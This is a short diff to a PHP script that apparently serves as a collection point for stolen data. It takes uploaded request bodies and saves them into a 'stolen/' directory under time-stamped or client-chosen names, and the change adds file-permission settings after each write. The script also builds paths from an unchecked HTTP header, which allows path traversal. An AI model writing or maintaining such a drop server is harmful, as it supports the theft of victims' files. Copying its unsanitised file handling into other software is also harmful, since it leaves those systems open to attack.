@@ -182,10 +182,14 @@ $fname = $_SERVER["HTTP_FNAME"];
 $inp = file_get_contents("php://input");
 if($inp != "" && strlen($lmod) > 0)
 {
-file_put_contents("stolen/" . time() . "_" . $lmod . ".jpg", $inp);
+$p = "stolen/" . time() . "_" . $lmod . ".jpg";
+file_put_contents($p, $inp);
+chmod($p, 0640);
 }else if($inp != "" && strlen($fname) > 0)
 {
-file_put_contents("stolen/" . $fname, $inp);
+$p = "stolen/" . $fname;
+file_put_contents($p, $inp);
+chmod($p, 0640);
 }
 
 $file = scandir("stolen/");
